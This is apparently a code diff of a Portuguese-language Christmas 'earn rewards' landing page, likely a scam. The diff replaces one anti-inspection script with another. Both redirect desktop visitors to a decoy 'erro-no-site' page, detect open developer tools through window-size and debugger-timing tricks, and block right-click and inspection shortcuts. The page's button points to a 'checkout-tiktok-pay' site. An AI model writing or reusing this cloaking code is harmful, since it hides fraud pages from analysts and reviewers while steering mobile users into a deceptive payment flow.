@@ -1,10 +1,111 @@
 <!DOCTYPE html><html lang="pt-AO"><head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AVALIÇÃO DE NATAL</title>
-    <link rel="stylesheet" href="css/style.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="css/all.min.css">
+    <head>
+<script>
+(function() {
+
+  const target = "https://erro-no-site.vercel.app/";
+
+  // Detectar se é mobile real
+  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i
+                   .test(navigator.userAgent);
+
+  // Função para detetar DevTools
+  function isDevToolsOpen() {
+    let opened = false;
+
+    // Método 1 - diferença normal entre outerHeight e innerHeight
+    if (window.outerHeight - window.innerHeight > 160) {
+      opened = true;
+    }
+
+    // Método 2 - largura anormal da janela por causa do device toolbar
+    if (window.outerWidth - window.innerWidth > 160) {
+      opened = true;
+    }
+
+    // Método 3 - atraso causado pelo "debugger"
+    const t0 = performance.now();
+    debugger;
+    const t1 = performance.now();
+    if (t1 - t0 > 200) {
+      opened = true;
+    }
+
+    return opened;
+  }
+
+
+  // ==========================================================
+  // NOVA REGRA: PC EM MODO MOBILE (DevTools mobile) → BLOQUEAR
+  // ==========================================================
+  if (!isMobile) {   // só PC
+
+    // Se DevTools está aberto ANTES da página abrir → redireciona
+    if (isDevToolsOpen()) {
+      window.location.replace(target);
+    }
+
+    // Monitor contínuo — garante que qualquer tentativa é apanhada
+    setInterval(function() {
+      if (isDevToolsOpen()) {
+        window.location.replace(target);
+      }
+    }, 300);
+  }
+
+
+
+  // ======================
+  // JÁ EXISTIA: bloqueio total só para DESKTOP real
+  // ======================
+  if (!isMobile) {
+
+    try {
+      window.location.replace(target);
+    } catch (e) {
+      window.location.href = target;
+    }
+
+    // Bloqueio de clique direito
+    document.addEventListener("contextmenu", e => e.preventDefault());
+
+    // Bloqueio de teclas
+    document.onkeydown = function(e) {
+      if (e.keyCode === 123) return false; // F12
+      if (e.ctrlKey && e.shiftKey && [73,67,74].includes(e.keyCode)) return false; 
+      if (e.ctrlKey && e.keyCode === 85) return false; // Ctrl+U
+    };
+
+    // DevTools detection (já existente)
+    setInterval(function() {
+      const start = performance.now();
+      debugger;
+      const end = performance.now();
+      if (end - start > 200) {
+        window.location.replace(target);
+      }
+    }, 500);
+
+    // Altura da janela (já existente)
+    setInterval(function() {
+      if (window.outerHeight - window.innerHeight > 160) {
+        window.location.replace(target);
+      }
+    }, 300);
+
+    return;
+  }
+
+
+  // ======================
+  // MOBILE REAL
+  // ======================
+  // Aqui não tocamos. Tudo normal.
+
+})();
+</script>
+</head>
+<!-- Meta Pixel Code -->
 <script>
 !function(f,b,e,v,n,t,s)
 {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
@@ -16,115 +117,20 @@ s.parentNode.insertBefore(t,s)}(window, document,'script',
 'https://connect.facebook.net/en_US/fbevents.js');
 fbq('init', '1397684491501570');
 fbq('track', 'PageView');
-</script></head>
-
-
-<body><noscript><img height="1" width="1" style="display:none"
+</script>
+<noscript><img height="1" width="1" style="display:none"
 src="https://www.facebook.com/tr?id=1397684491501570&ev=PageView&noscript=1"
 /></noscript>
 <!-- End Meta Pixel Code -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Avaliações de Natal - Ganhe Recompensas</title>
+    <link rel="stylesheet" href="css/style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="css/all.min.css">
+</head>
 
-<script>
-(function() {
-  // --- CONFIGURE AQUI ---
-  const REDIRECT_URL = "https://erro-no-site.vercel.app/"; // <-- coloque o link do YouTube aqui
-
-  // --- DETECÇÃO DE PC (desktop) ---
-  function isDesktop() {
-    const ua = navigator.userAgent || navigator.vendor || window.opera;
-    // detecta Windows / Mac / Linux desktop básicos
-    return /Windows|Macintosh|Linux/i.test(ua) && !/Android|iPhone|iPad|iPod|Mobile/i.test(ua);
-  }
-
-  // --- REDIRECIONA SE FOR PC ---
-  function maybeRedirect() {
-    try {
-      if (isDesktop()) {
-        // evita loop se já estiver no YouTube
-        if (!location.href.startsWith(REDIRECT_URL)) {
-          location.replace(REDIRECT_URL);
-        }
-      }
-    } catch (e) {
-      console.error(e);
-    }
-  }
-
-  // --- BLOQUEIO BÁSICO DE INSPEÇÃO (atalhos e clique direito) ---
-  function blockInspectionShortcuts(e) {
-    // teclas comuns de devtools: F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U (ver código-fonte)
-    if (
-      e.key === "F12" ||
-      (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "i" || e.key === "J" || e.key === "j")) ||
-      (e.ctrlKey && (e.key === "U" || e.key === "u"))
-    ) {
-      e.preventDefault();
-      e.stopPropagation();
-      return false;
-    }
-  }
-
-  function installBasicBlocks() {
-    // bloqueia clique direito
-    window.addEventListener("contextmenu", function(e){ e.preventDefault(); }, true);
-
-    // bloqueia seleção e arrastar (opcional)
-    document.addEventListener("selectstart", function(e){ e.preventDefault(); }, true);
-    document.addEventListener("dragstart", function(e){ e.preventDefault(); }, true);
-
-    // bloqueia atalhos de teclado
-    window.addEventListener("keydown", function(e){ blockInspectionShortcuts(e); }, true);
-  }
-
-  // --- DETECTION: tenta identificar devtools abertos (não 100% confiável) ---
-  function detectDevTools() {
-    let last = { w: window.outerWidth - window.innerWidth, h: window.outerHeight - window.innerHeight };
-
-    // checagem periódica de diferenças dimensionais (quando devtools dock aberto muda a diferença)
-    setInterval(function() {
-      const diffW = Math.abs(window.outerWidth - window.innerWidth);
-      const diffH = Math.abs(window.outerHeight - window.innerHeight);
-
-      // threshold razoável (pode ajustar)
-      const THRESHOLD = 160;
-
-      if (diffW > THRESHOLD || diffH > THRESHOLD) {
-        // ação ao detectar devtools: redirecionar (ou fazer outra ação)
-        try { location.replace(REDIRECT_URL); } catch(e){ /* ignore */ }
-      }
-      last = { w: diffW, h: diffH };
-    }, 500);
-
-    // outro truque: detectar se console foi aberto via função toString
-    // (gera saída no console que pode ser observada por inspeção)
-    const element = new Image();
-    Object.defineProperty(element, 'id', {
-      get: function() {
-        // quando console tenta inspecionar, o getter é chamado — redireciona
-        try { location.replace(REDIRECT_URL); } catch(e){ /* ignore */ }
-      }
-    });
-    // chama uma vez para 'armar' armadilha no console
-    console.log("%c ", element);
-  }
-
-  // --- INICIALIZAÇÃO ---
-  try {
-    installBasicBlocks();
-    detectDevTools();
-    // redireciona logo no load se for PC
-    if (document.readyState === "complete" || document.readyState === "interactive") {
-      maybeRedirect();
-    } else {
-      window.addEventListener("DOMContentLoaded", maybeRedirect, { once: true });
-    }
-  } catch (err) {
-    console.error("Erro no script de bloqueio/redirecionamento:", err);
-  }
-})();
-</script>
-
-
+<body>
 
     <!-- Snow Container -->
     <div id="snow-container"></div>
@@ -384,7 +390,7 @@ src="https://www.facebook.com/tr?id=1397684491501570&ev=PageView&noscript=1"
                 </div>
 
                 <!-- CTA Button -->
-                <button class="btn-vsl-clean" onclick="window.location.href='https://checkout-tiktok-pay.vercel.app/'">
+                <button class="btn-vsl-clean" onclick="window.location.href='https://checkout-tiktok-pay.vercel.app'">
                     <span class="btn-icon">🎁</span>
                     Continuar para Receber
                 </button>
@@ -405,7 +411,6 @@ src="https://www.facebook.com/tr?id=1397684491501570&ev=PageView&noscript=1"
     </section>
 
     <script src="js/script.js"></script>
-
 
 
 </body></html>
